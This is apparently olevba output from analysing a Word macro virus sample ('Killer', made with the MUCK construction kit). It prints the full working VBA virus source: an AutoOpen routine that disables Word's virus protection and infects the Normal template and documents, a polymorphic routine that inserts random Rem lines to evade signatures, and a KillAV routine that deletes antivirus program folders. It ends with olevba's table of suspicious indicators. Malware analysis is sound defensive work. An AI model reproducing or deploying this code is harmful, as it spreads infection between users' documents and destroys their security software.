olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Muck-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Muck-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Killer.bas 
in file: ./Virus.MSWord.Muck-based - OLE stream: 'Macros/VBA/Killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
    Rem 261.7086    8.004179    16.48362    143.7992    13.93953
    Rem 261,7086    8,004179    16,48362    143,7992    13,93953
'Mini ULTRAS Construction Kit (MUCK)
'ULTRAS 1998
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134.5766    30.56086    48.15528    170.7428    48.01164

    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
    Rem 134,5766    30,56086    48,15528    170,7428    48,01164
'VirusName: Killer
'Author Name: Killer


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255.2733    55.55882    146.1948    150.2671    1.108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
    Rem 255,2733    55,55882    146,1948    150,2671    1,108831
'AutoOpen
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub AutoOpen()
On Error Resume Next
Call KillAV
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Killer" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Killer" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
End If
If DocInfect = False Then
    Rem 283.327 51.8257 42.20687    50.28157    40.66028
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
End If
    Rem 283,327 51,8257 42,20687    50,28157    40,66028
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
Application.DisplayAlerts = wdAlertsAll
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
Call Polymorphic
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 238.8151    61.36893    8.560724    106.6425    22.9663
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
End Sub
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
    Rem 131.7976    73.55017    101.0788    112.9756    20.99436
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 238,8151    61,36893    8,560724    106,6425    22,9663
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 126.6174    12.83532    26.05145    116.3857    20.09359
    Rem 131,7976    73,55017    101,0788    112,9756    20,99436
    Rem 324,2924    26,0965 101,3086    37,361  9,114662
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 324.2924    26.0965 101.3086    37.361  9.114662
    Rem 126,6174    12,83532    26,05145    116,3857    20,09359
    Rem 324,2924    26,0965 101,3086    37,361  9,114662

    Rem 324,2924    26,0965 101,3086    37,361  9,114662
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ToolsMacro macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsMacro()
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 160.8301    32.38673    43.15705    10.00683    11.94841
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
Call Polymorphic
    Rem 160,8301    32,38673    43,15705    10,00683    11,94841
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
    Rem 117.0568    50.30015    86.73123    28.1344 45.98871
    Rem 117,0568    50,30015    86,73123    28,1344 45,98871
Beep
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'ViewVBCode macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ViewVBCode()
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 263.681 23.165  48.31168    139.4532    0.6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 416.8546    34.42089    108.4716    90.4417 25.17314
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
    Rem 263,681 23,165  48,31168    139,4532    0,6868644
    Rem 416,8546    34,42089    108,4716    90,4417 25,17314
Call Polymorphic
Beep
End Sub
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754

    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
    Rem 36.72516    36.63772    144.9168    47.04629    38.4754
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Rem 36,72516    36,63772    144,9168    47,04629    38,4754
'ToolsCustomize macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub ToolsCustomize()
Call Polymorphic
Beep
End Sub
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224
    Rem 230.2697    31.23772    17.18005    141.1192    22.5224
    Rem 230,2697    31,23772    17,18005    141,1192    22,5224

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'FileTemplates macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub FileTemplates()
Call Polymorphic
Beep
End Sub


'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'Polymorphic macro
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271.223 66.61842    3.001337    37.86636    3.623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 271,223 66,61842    3,001337    37,86636    3,623713
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
    Rem 370.593 56.72303    7.256441    74.52589    42.26835
    Rem 370,593 56,72303    7,256441    74,52589    42,26835
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub Polymorphic()
On Error Resume Next
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    Rem 169.959 76.95625    139.4313    10.12263    46.52827
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
    Rem 169,959 76,95625    139,4313    10,12263    46,52827
PoNu = Int(Rnd() * 28 + 1)
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
For Mutate = 1 To PoNu
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 268.0692    78.88745    145.7543    40.83588    34.06066
PoRL = Application.VBE.ActiveVBProject.VBComponents("Killer").CodeModule.CountOfLines
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
    Rem 268,0692    78,88745    145,7543    40,83588    34,06066
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("Killer").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e
Next Mutate
End Sub

'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
'KillAV macro
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Sub KillAV()
On Error Resume Next
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Program Files\McAfee\VirusScan95\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 27.71689    31.22332    58.39927    88.18105    7.627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 27,71689    31,22332    58,39927    88,18105    7,627491
    Rem 110,9888    42,70985    17,01915    179,8946    33,13262
    Rem 110.9888    42.70985    17.01915    179.8946    33.13262
Kill "C:\VS95\*.*"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

